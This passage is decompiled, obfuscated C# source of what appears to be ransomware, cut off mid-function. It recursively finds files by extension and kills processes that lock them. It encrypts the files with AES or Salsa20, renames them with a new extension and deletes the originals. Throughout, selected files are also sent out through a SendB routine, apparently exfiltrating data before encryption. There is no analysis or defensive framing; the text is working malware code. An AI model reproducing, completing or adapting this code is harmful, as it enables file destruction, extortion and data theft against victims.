			CS_0024_003C_003E8__locals0.t = string_0;
			if (AccessToken && !getOSInfo().Contains(_003C_003Ec__DisplayClass21.getString_0(107389590)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						SetAccess(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (MultipleThreads == _003C_003Ec__DisplayClass21.getString_0(107396926))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					WorkerCrypter(CS_0024_003C_003E8__locals0.t, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.uzantilar, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.crypt_uzantisi, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.excomunicated, CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals22.sifre);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				WorkerCrypter(CS_0024_003C_003E8__locals0.t, CS_0024_003C_003E8__locals0.uzantilar, CS_0024_003C_003E8__locals0.crypt_uzantisi, CS_0024_003C_003E8__locals0.excomunicated, CS_0024_003C_003E8__locals0.sifre);
			}
		});
	}

	public static void WorkerCrypter(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393364));
		List<string> list3 = list2;
		if (AlternateAlgo == getString_0(107396374))
		{
			list = TraverseTree(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = RecursiveFileSearch.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((ProcessAll == getString_0(107396374) && !item.EndsWith(text)) || EncryptedFiles.Contains(item))
				{
					continue;
				}
				if (ReleaseLockedFiles == getString_0(107396917))
				{
					try
					{
						if (LockedFiles.Islocked(item))
						{
							LockedFiles.Killproc(item);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(item);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(item)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (PartialEncrytion == getString_0(107396917) && fileStream.Length > Convert.ToInt32(PartialSize) * 1024 * 1024 && !list3.Contains(text))
					{
						if (Styler == getString_0(107396917))
						{
							foreach (string item2 in extstyl)
							{
								if (item.ToLower().EndsWith(item2) && LimitMe == getString_0(107396917))
								{
									if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && LimitMe == getString_0(107396374))
								{
									try
									{
										UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = Encryptions.ReadFromFile(item, Convert.ToInt32(PartialSize) * 1024 * 1024);
						byte[] encrypted = Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						Encryptions.WriteToFile(item, encrypted);
						if (string_2 != getString_0(107390012))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107390012))
					{
						Encrypt(item, item + string_2, PasswordBytes);
					}
					else
					{
						Encrypt(item, item + getString_0(107389975), PasswordBytes);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void WorkerCrypter2(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		_003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass31();
		CS_0024_003C_003E8__locals0.files = list_0;
		CS_0024_003C_003E8__locals0.extension = string_1;
		CS_0024_003C_003E8__locals0.excluded = string_2;
		CS_0024_003C_003E8__locals0.DynamicPass = string_3;
		CS_0024_003C_003E8__locals0.domeall = new List<string> { getString_0(107393364) };
		if (ProcessAll == getString_0(107396374))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string file in CS_0024_003C_003E8__locals0.files)
				{
					if (CS_0024_003C_003E8__locals0.excluded.Length != 0)
					{
						string[] excluded2 = CS_0024_003C_003E8__locals0.excluded;
						int num2 = 0;
						while (num2 < excluded2.Length)
						{
							string value2 = excluded2[num2];
							if (!file.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (file.EndsWith(CS_0024_003C_003E8__locals0.extension))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (file.EndsWith(string_0) && !EncryptedFiles.Contains(file))
					{
						if (ReleaseLockedFiles == _003C_003Ec__DisplayClass31.getString_0(107396934))
						{
							try
							{
								if (LockedFiles.Islocked(file))
								{
									LockedFiles.Killproc(file);
								}
							}
							catch
							{
							}
						}
						EncryptedFiles.Add(file);
						if (!EncryptedDirs.Contains(Path.GetDirectoryName(file)))
						{
							EncryptedDirs.Add(Path.GetDirectoryName(file));
						}
						RemoveReadOnlyAttribute(file);
						try
						{
							try
							{
								if (new FileInfo(file).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (debugmode)
								{
									try
									{
										File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + file + _003C_003Ec__DisplayClass31.getString_0(107400840) + ex12.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (PartialEncrytion == _003C_003Ec__DisplayClass31.getString_0(107396934) && new FileInfo(file).Length > Convert.ToInt32(PartialSize) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.domeall.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34();
								CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32 = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
									{
										File.Move(file, file + CS_0024_003C_003E8__locals0.extension);
									}
								}
								catch (Exception ex14)
								{
									if (!debugmode)
									{
										break;
									}
									try
									{
										File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + file + _003C_003Ec__DisplayClass31.getString_0(107401323) + ex14.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.partfileInfo = _003C_003Ec__DisplayClass31.getString_0(107393381);
								if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
								{
									CS_0024_003C_003E8__locals0.partfileInfo = file + CS_0024_003C_003E8__locals0.extension;
								}
								else
								{
									CS_0024_003C_003E8__locals0.partfileInfo = file;
								}
								if (Styler == _003C_003Ec__DisplayClass31.getString_0(107396934))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item in extstyl)
										{
											if (CS_0024_003C_003E8__locals0.partfileInfo.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32.extension) && LimitMe == _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107396937))
											{
												if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.partfileInfo).Length)
												{
													try
													{
														UtilMe.SendB(_003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107394009), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107394004), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107393959), CS_0024_003C_003E8__locals0.partfileInfo);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.partfileInfo.ToLower().EndsWith(item) && LimitMe == _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107396394))
											{
												try
												{
													UtilMe.SendB(_003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107394009), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107394004), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass34.getString_0(107393959), CS_0024_003C_003E8__locals0.partfileInfo);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = Crypto.RandomPass(32);
								string s3 = CryptographyHelper.Encrypt(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = Encryptions.ReadFromFile(CS_0024_003C_003E8__locals0.partfileInfo, Convert.ToInt32(PartialSize) * 1024 * 1024);
								Encryptions.WriteToFile(encrypted: (!chacha) ? (Unique ? Encryptions.AESEncryptBytes(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Encryptions.AESEncryptBytes(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (Unique ? Salsa20.EncryptSS20(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Salsa20.EncryptSS20(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), filename: CS_0024_003C_003E8__locals0.partfileInfo, cryptPass: bytes3);
							}
							else
							{
								string text4 = Crypto.RandomPass(32);
								string s4 = CryptographyHelper.Encrypt(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
								{
									if (!chachapetit)
									{
										if (!Unique)
										{
											Encrypt2(file, file + CS_0024_003C_003E8__locals0.extension, PasswordBytes);
										}
										else
										{
											Encrypt2(file, file + CS_0024_003C_003E8__locals0.extension, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!Unique)
											{
												Encrypt3(file, file + CS_0024_003C_003E8__locals0.extension, PasswordBytes);
											}
											else
											{
												Encrypt3(file, file + CS_0024_003C_003E8__locals0.extension, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (debugmode)
											{
												try
												{
													File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + file + _003C_003Ec__DisplayClass31.getString_0(107389983) + ex16.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!chachapetit)
								{
									if (!Unique)
									{
										Encrypt2(file, file + _003C_003Ec__DisplayClass31.getString_0(107389992), PasswordBytes);
									}
									else
									{
										Encrypt2(file, file + _003C_003Ec__DisplayClass31.getString_0(107389992), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!Unique)
										{
											Encrypt3(file, file, PasswordBytes);
										}
										else
										{
											Encrypt3(file, file, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (debugmode)
										{
											try
											{
												File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + file + _003C_003Ec__DisplayClass31.getString_0(107389983) + ex18.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (Unique)
								{
									if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
									{
										WriteSignatureFullEncode(file + CS_0024_003C_003E8__locals0.extension, bytes4);
									}
									else
									{
										WriteSignatureFullEncode(file, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.files.Remove(file);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.files, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37();
			CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32 = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.fileInfo = string_0;
			if (CS_0024_003C_003E8__locals0.excluded.Length != 0)
			{
				string[] excluded = CS_0024_003C_003E8__locals0.excluded;
				int num = 0;
				while (num < excluded.Length)
				{
					string value = excluded[num];
					if (!CS_0024_003C_003E8__locals0.fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.fileInfo.EndsWith(CS_0024_003C_003E8__locals0.extension))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!EncryptedFiles.Contains(CS_0024_003C_003E8__locals0.fileInfo))
			{
				if (ReleaseLockedFiles == _003C_003Ec__DisplayClass31.getString_0(107396934))
				{
					try
					{
						if (LockedFiles.Islocked(CS_0024_003C_003E8__locals0.fileInfo))
						{
							LockedFiles.Killproc(CS_0024_003C_003E8__locals0.fileInfo);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(CS_0024_003C_003E8__locals0.fileInfo);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.fileInfo)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.fileInfo));
				}
				RemoveReadOnlyAttribute(CS_0024_003C_003E8__locals0.fileInfo);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.fileInfo).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (debugmode)
						{
							try
							{
								File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + _003C_003Ec__DisplayClass31.getString_0(107400840) + ex2.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (PartialEncrytion == _003C_003Ec__DisplayClass31.getString_0(107396934) && new FileInfo(CS_0024_003C_003E8__locals0.fileInfo).Length > Convert.ToInt32(PartialSize) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
							{
								File.Move(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + CS_0024_003C_003E8__locals0.extension);
							}
						}
						catch (Exception ex4)
						{
							if (debugmode)
							{
								try
								{
									File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + _003C_003Ec__DisplayClass31.getString_0(107401323) + ex4.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
						{
							CS_0024_003C_003E8__locals0.fileInfo += CS_0024_003C_003E8__locals0.extension;
						}
						if (Styler == _003C_003Ec__DisplayClass31.getString_0(107396934))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in extstyl)
								{
									if (CS_0024_003C_003E8__locals0.fileInfo.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals32.extension) && LimitMe == _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107396940))
									{
										if (Convert.ToInt32(MaxSize) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.fileInfo).Length)
										{
											try
											{
												UtilMe.SendB(_003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107394012), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107394007), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107393962), CS_0024_003C_003E8__locals0.fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.fileInfo.ToLower().EndsWith(item2) && LimitMe == _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107396397))
									{
										try
										{
											UtilMe.SendB(_003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107394012), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107394007), _003C_003Ec__DisplayClass31._003C_003Ec__DisplayClass37.getString_0(107393962), CS_0024_003C_003E8__locals0.fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = Crypto.RandomPass(32);
						string s = CryptographyHelper.Encrypt(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = Encryptions.ReadFromFile(CS_0024_003C_003E8__locals0.fileInfo, Convert.ToInt32(PartialSize) * 1024 * 1024);
						Encryptions.WriteToFile(encrypted: (!chacha) ? (Unique ? Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Encryptions.AESEncryptBytes(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (Unique ? Salsa20.EncryptSS20(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : Salsa20.EncryptSS20(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), filename: CS_0024_003C_003E8__locals0.fileInfo, cryptPass: bytes);
					}
					else
					{
						string text2 = Crypto.RandomPass(32);
						string s2 = CryptographyHelper.Encrypt(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
						{
							if (!chachapetit)
							{
								if (!Unique)
								{
									Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + CS_0024_003C_003E8__locals0.extension, PasswordBytes);
								}
								else
								{
									Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + CS_0024_003C_003E8__locals0.extension, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!Unique)
									{
										Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + CS_0024_003C_003E8__locals0.extension, PasswordBytes);
									}
									else
									{
										Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + CS_0024_003C_003E8__locals0.extension, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (debugmode)
									{
										try
										{
											File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + _003C_003Ec__DisplayClass31.getString_0(107389983) + ex6.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!chachapetit)
						{
							if (!Unique)
							{
								Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + _003C_003Ec__DisplayClass31.getString_0(107389992), PasswordBytes);
							}
							else
							{
								Encrypt2(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo + _003C_003Ec__DisplayClass31.getString_0(107389992), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!Unique)
								{
									Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo, PasswordBytes);
								}
								else
								{
									Encrypt3(CS_0024_003C_003E8__locals0.fileInfo, CS_0024_003C_003E8__locals0.fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (debugmode)
								{
									try
									{
										File.AppendAllText(DebugReport, _003C_003Ec__DisplayClass31.getString_0(107389732) + CS_0024_003C_003E8__locals0.fileInfo + _003C_003Ec__DisplayClass31.getString_0(107389983) + ex8.Message + _003C_003Ec__DisplayClass31.getString_0(107396307));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (Unique)
						{
							if (CS_0024_003C_003E8__locals0.extension != _003C_003Ec__DisplayClass31.getString_0(107390029))
							{
								WriteSignatureFullEncode(CS_0024_003C_003E8__locals0.fileInfo + CS_0024_003C_003E8__locals0.extension, bytes2);
							}
							else
							{
								WriteSignatureFullEncode(CS_0024_003C_003E8__locals0.fileInfo, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.files.Remove(CS_0024_003C_003E8__locals0.fileInfo);
		});
	}

	private static void Encrypt(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (Styler == getString_0(107396917))
					{
						foreach (string item in extstyl)
						{
							if (string_0.ToLower().EndsWith(item) && LimitMe == getString_0(107396917))
							{
								if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && LimitMe == getString_0(107396374))
							{
								try
								{
									UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389975)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389975), getString_0(107393364)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void Encrypt3(string string_0, string string_1, byte[] byte_0)
	{
		if (Styler == getString_0(107396917))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in extstyl)
			{
				if (string_0.ToLower().EndsWith(item) && LimitMe == getString_0(107396917))
				{
					if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && LimitMe == getString_0(107396374))
				{
					try
					{
						UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = Salsa20.EncryptSS20(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void Encrypt2(string string_0, string string_1, byte[] byte_0)
	{
		_003C_003Ec__DisplayClass3f CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass3f();
		CS_0024_003C_003E8__locals0.inputFile = string_0;
		CS_0024_003C_003E8__locals0.outputFile = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string outputFile = CS_0024_003C_003E8__locals0.outputFile;
			FileStream fileStream = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (Mmf == getString_0(107396917))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.inputFile, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.inputFile, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.inputFile, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.outputFile.Length > 0)
				{
					if (Styler == getString_0(107396917))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in extstyl)
						{
							if (CS_0024_003C_003E8__locals0.inputFile.ToLower().EndsWith(item) && LimitMe == getString_0(107396917))
							{
								if (Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), CS_0024_003C_003E8__locals0.inputFile);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.inputFile.ToLower().EndsWith(item) && LimitMe == getString_0(107396374))
							{
								try
								{
									UtilMe.SendB(getString_0(107393989), getString_0(107393984), getString_0(107393939), CS_0024_003C_003E8__locals0.inputFile);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.inputFile);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.outputFile.EndsWith(getString_0(107389975)))
					{
						File.Move(CS_0024_003C_003E8__locals0.outputFile, CS_0024_003C_003E8__locals0.outputFile.Replace(getString_0(107389975), getString_0(107393364)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.outputFile))
							{
								File.Delete(CS_0024_003C_003E8__locals0.outputFile);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (debugmode)
			{
				try
				{
